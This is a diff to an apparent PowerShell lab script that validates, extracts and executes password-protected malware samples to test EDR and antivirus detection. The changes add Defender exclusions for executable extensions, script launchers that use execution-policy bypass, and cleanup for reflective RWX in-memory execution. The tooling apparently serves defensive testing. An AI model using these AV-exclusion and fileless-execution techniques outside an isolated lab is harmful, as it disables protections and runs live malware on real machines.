@@ -39,13 +39,13 @@ param(
     [string]$Mode = "Validate",
 
     [Parameter()]
-    [string]$SamplesPath = $PSScriptRoot,
+    [string]$SamplesPath = $(if ($PSScriptRoot) { $PSScriptRoot } else { $PWD.Path }),
 
     [Parameter()]
     [string]$ExtractPath = "$env:TEMP\PolyTestSamples",
 
     [Parameter()]
-    [string]$LogPath = "$PSScriptRoot\validation_log_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt",
+    [string]$LogPath = $(if ($PSScriptRoot) { "$PSScriptRoot\validation_log_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt" } else { "$($PWD.Path)\validation_log_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt" }),
 
     # Execution method: Disk (write to disk, run normally) or InMemory (reflective/fileless)
     [Parameter()]
@@ -76,7 +76,13 @@ function Write-Log {
     param([string]$Message, [string]$Level = "INFO")
     $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
     $entry = "[$timestamp] [$Level] $Message"
-    Add-Content -Path $LogPath -Value $entry
+    try {
+        $logDir = Split-Path $LogPath -Parent
+        if ($logDir -and -not (Test-Path $logDir)) {
+            New-Item -ItemType Directory -Path $logDir -Force | Out-Null
+        }
+        Add-Content -Path $LogPath -Value $entry -ErrorAction SilentlyContinue
+    } catch { }
     switch ($Level) {
         "OK"    { Write-Host "  [+] $Message" -ForegroundColor Green }
         "FAIL"  { Write-Host "  [-] $Message" -ForegroundColor Red }
@@ -171,10 +177,9 @@ function Set-LabEnvironment {
     }
 
     # 5. Add process exclusions for common sample extensions
-    $exeExclusions = @("*.exe", "*.dll", "*.scr")
-    foreach ($ext in $exeExclusions) {
+    foreach ($ext in @("exe", "dll", "scr")) {
         try {
-            Add-MpPreference -ExclusionExtension $ext.TrimStart("*.") -ErrorAction Stop
+            Add-MpPreference -ExclusionExtension $ext -ErrorAction Stop
         }
         catch { }
     }
@@ -233,9 +238,15 @@ function Restore-LabEnvironment {
 function Test-SampleIntegrity {
     param([string]$FamilyPath)
 
+    if (-not $FamilyPath) {
+        Write-Log "Skipping empty family path" "WARN"
+        $script:SkippedCount++
+        return $null
+    }
+
     $familyName = Split-Path $FamilyPath -Leaf
     Write-Host "`n  --- $familyName " -NoNewline
-    Write-Host ("-" * (50 - $familyName.Length)) -ForegroundColor DarkGray
+    Write-Host ("-" * [Math]::Max(0, (50 - $familyName.Length))) -ForegroundColor DarkGray
 
     $zipFile = Get-ChildItem -Path $FamilyPath -Filter "*.zip" | Select-Object -First 1
     if (-not $zipFile) {
@@ -259,6 +270,9 @@ function Test-SampleIntegrity {
     $passFile = Get-ChildItem -Path $FamilyPath -Filter "*.pass" | Select-Object -First 1
     if ($passFile) {
         $result.Password = (Get-Content $passFile.FullName -Raw).Trim()
+    } else {
+        # Default password for most samples from theZoo and similar repos
+        $result.Password = "infected"
     }
 
     $allPassed = $true
@@ -269,7 +283,7 @@ function Test-SampleIntegrity {
         $expectedLine = (Get-Content $sha256File.FullName -Raw).Trim()
 
         # Detect if it's actually a SHA1 (40 hex chars) stored in .sha256 file
-        if ($expectedLine -match '^([a-f0-9]{40})\s') {
+        if ($expectedLine -match '^([a-f0-9]{40})(\s|$)') {
             Write-Log "SHA256 file contains SHA1 hash (40 chars) -- validating as SHA1" "WARN"
             $expectedHash = $Matches[1]
             $computedHash = (Get-FileHash -Path $zipFile.FullName -Algorithm SHA1).Hash.ToLower()
@@ -281,7 +295,7 @@ function Test-SampleIntegrity {
                 $allPassed = $false
             }
         }
-        elseif ($expectedLine -match '^([a-f0-9]{64})\s') {
+        elseif ($expectedLine -match '^([a-f0-9]{64})(\s|$)') {
             $expectedHash = $Matches[1]
             $computedHash = (Get-FileHash -Path $zipFile.FullName -Algorithm SHA256).Hash.ToLower()
             $result.SHA256 = $computedHash
@@ -304,7 +318,7 @@ function Test-SampleIntegrity {
     }
     if ($shasumFile) {
         $expectedLine = (Get-Content $shasumFile.FullName -Raw).Trim()
-        if ($expectedLine -match '^([a-f0-9]{40})\s') {
+        if ($expectedLine -match '^([a-f0-9]{40})(\s|$)') {
             $expectedHash = $Matches[1]
             $computedHash = (Get-FileHash -Path $zipFile.FullName -Algorithm SHA1).Hash.ToLower()
             $result.SHA1 = $computedHash
@@ -324,7 +338,7 @@ function Test-SampleIntegrity {
         $expectedHash = ""
 
         # Format: "hash  filename"
-        if ($expectedLine -match '^([a-f0-9]{32})\s') {
+        if ($expectedLine -match '^([a-f0-9]{32})(\s|$)') {
             $expectedHash = $Matches[1]
         }
         # Format: "MD5 (filename) = hash"
@@ -383,12 +397,20 @@ function Expand-Sample {
         if (-not $sevenZip) {
             $sevenZip = Get-Command "C:\Program Files\7-Zip\7z.exe" -ErrorAction SilentlyContinue
         }
+        if (-not $sevenZip) {
+            $sevenZip = Get-Command "C:\Program Files (x86)\7-Zip\7z.exe" -ErrorAction SilentlyContinue
+        }
 
         if ($sevenZip) {
             $password = $SampleInfo.Password
             $szArgs = @("x", "-y", "-o$destDir", "-p$password", $SampleInfo.ZipFile)
-            & $sevenZip.Source @szArgs 2>&1 | Out-Null
-            Write-Log "Extracted via 7-Zip" "OK"
+            $szOutput = & $sevenZip.Source @szArgs 2>&1
+            if ($LASTEXITCODE -ne 0) {
+                Write-Log "7-Zip extraction warning (exit code: $LASTEXITCODE)" "WARN"
+                $szOutput | ForEach-Object { Write-Log "  7z: $_" "WARN" }
+            } else {
+                Write-Log "Extracted via 7-Zip" "OK"
+            }
         }
         else {
             # Fallback: PowerShell Expand-Archive (no password support)
@@ -449,10 +471,10 @@ function Invoke-SampleExecution {
         return
     }
 
-    $exeSamples = $script:ExtractedSamples | Where-Object {
+    $exeSamples = @($script:ExtractedSamples | Where-Object {
         $_.FileName -match '\.(exe|dll|scr|bat|cmd|ps1|vbs|js)$' -or
         -not ($_.FileName -match '\.')
-    }
+    })
 
     if ($exeSamples.Count -eq 0) {
         Write-Log "No executable samples found in extracted files" "WARN"
@@ -490,11 +512,31 @@ function Invoke-DiskExecution {
     Write-Log "  Method: Disk (filesystem execution)" "INFO"
     Write-Log "  Path: $SamplePath" "INFO"
 
+    # Verify file still exists (Cortex/Defender may have quarantined it)
+    if (-not (Test-Path $SamplePath)) {
+        Write-Log "  File not found (likely quarantined by EDR/AV): $SamplePath" "WARN"
+        return
+    }
+
     try {
         if ($SamplePath -match '\.dll$') {
-            # DLLs: use rundll32
-            $proc = Start-Process -FilePath "rundll32.exe" -ArgumentList "$SamplePath,DllMain" -PassThru -ErrorAction Stop
-            Write-Log "  PID: $($proc.Id) -- Launched via rundll32" "OK"
+            # DLLs: try common export names
+            $dllExports = @("DllMain", "DllRegisterServer", "ServiceMain", "Start", "Run")
+            $exportUsed = $dllExports[0]
+            $proc = Start-Process -FilePath "rundll32.exe" -ArgumentList "$SamplePath,$exportUsed" -PassThru -ErrorAction Stop
+            Write-Log "  PID: $($proc.Id) -- Launched via rundll32 ($exportUsed)" "OK"
+        }
+        elseif ($SamplePath -match '\.(bat|cmd)$') {
+            $proc = Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$SamplePath`"" -PassThru -ErrorAction Stop
+            Write-Log "  PID: $($proc.Id) -- Launched via cmd.exe" "OK"
+        }
+        elseif ($SamplePath -match '\.(vbs|js)$') {
+            $proc = Start-Process -FilePath "wscript.exe" -ArgumentList "`"$SamplePath`"" -PassThru -ErrorAction Stop
+            Write-Log "  PID: $($proc.Id) -- Launched via wscript.exe" "OK"
+        }
+        elseif ($SamplePath -match '\.ps1$') {
+            $proc = Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$SamplePath`"" -PassThru -ErrorAction Stop
+            Write-Log "  PID: $($proc.Id) -- Launched via powershell.exe" "OK"
         }
         else {
             $proc = Start-Process -FilePath $SamplePath -PassThru -ErrorAction Stop
@@ -527,6 +569,12 @@ function Invoke-InMemoryExecution {
     param([string]$SamplePath, [string]$SampleName)
 
     Write-Log "  Method: InMemory (reflective loading)" "INFO"
+
+    # Verify file still exists
+    if (-not (Test-Path $SamplePath)) {
+        Write-Log "  File not found (likely quarantined by EDR/AV): $SamplePath" "WARN"
+        return
+    }
 
     try {
         # Read raw bytes into memory
@@ -610,6 +658,7 @@ public class K32 {
 "@
             }
 
+            $mem = [IntPtr]::Zero
             try {
                 # Allocate RWX memory
                 $allocSize = [uint32]$bytes.Length
@@ -638,7 +687,6 @@ public class K32 {
 
                 if ($thread -eq [IntPtr]::Zero) {
                     Write-Log "  CreateThread failed" "FAIL"
-                    [K32]::VirtualFree($mem, 0, 0x8000) | Out-Null
                     return
                 }
 
@@ -651,6 +699,13 @@ public class K32 {
             catch {
                 Write-Log "  Native in-memory execution caught: $($_.Exception.Message)" "WARN"
                 Write-Log "  (EDR/XDR may have blocked memory allocation or thread creation)" "INFO"
+            }
+            finally {
+                # Always free allocated memory to prevent leaks
+                if ($mem -ne [IntPtr]::Zero) {
+                    [K32]::VirtualFree($mem, 0, 0x8000) | Out-Null
+                    Write-Log "  Memory freed at 0x$($mem.ToString('X'))" "INFO"
+                }
             }
         }
     }
@@ -698,10 +753,18 @@ function Write-Summary {
 Write-Banner
 
 # Initialize log
-"=== Polymorphic Sample Validation Log ===" | Out-File -FilePath $LogPath
-"Started: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" | Add-Content -Path $LogPath
-"Mode: $Mode | ExecMethod: $ExecMethod | PrepareEnv: $PrepareEnv" | Add-Content -Path $LogPath
-"" | Add-Content -Path $LogPath
+try {
+    $logDir = Split-Path $LogPath -Parent
+    if ($logDir -and -not (Test-Path $logDir)) {
+        New-Item -ItemType Directory -Path $logDir -Force | Out-Null
+    }
+    "=== Polymorphic Sample Validation Log ===" | Out-File -FilePath $LogPath -ErrorAction Stop
+    "Started: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" | Add-Content -Path $LogPath
+    "Mode: $Mode | ExecMethod: $ExecMethod | PrepareEnv: $PrepareEnv" | Add-Content -Path $LogPath
+    "" | Add-Content -Path $LogPath
+} catch {
+    Write-Host "  [!] Could not create log file at $LogPath -- logging to console only" -ForegroundColor Yellow
+}
 
 # Phase 0: Prepare environment (if requested)
 if ($PrepareEnv) {
@@ -712,13 +775,13 @@ if ($PrepareEnv) {
 }
 
 # Discover sample families (all subdirectories except hidden/system)
-$families = Get-ChildItem -Path $SamplesPath -Directory | Where-Object {
+$families = @(Get-ChildItem -Path $SamplesPath -Directory | Where-Object {
     $_.Name -notlike ".*" -and $_.Name -ne "__MACOSX"
-}
+})
 
 # Filter by family if specified
 if ($Family) {
-    $families = $families | Where-Object { $_.Name -like $Family }
+    $families = @($families | Where-Object { $_.Name -like $Family })
     if ($families.Count -eq 0) {
         Write-Log "No family matching '$Family' found in $SamplesPath" "FAIL"
         Write-Log "Available families:" "INFO"
@@ -739,7 +802,9 @@ Write-Log "Found $($families.Count) sample families" "INFO"
 # Phase 1: Validate
 $results = @()
 foreach ($family in $families) {
-    $results += Test-SampleIntegrity -FamilyPath $family.FullName
+    if ($family -and $family.FullName) {
+        $results += Test-SampleIntegrity -FamilyPath $family.FullName
+    }
 }
 
 Write-Summary -Results $results
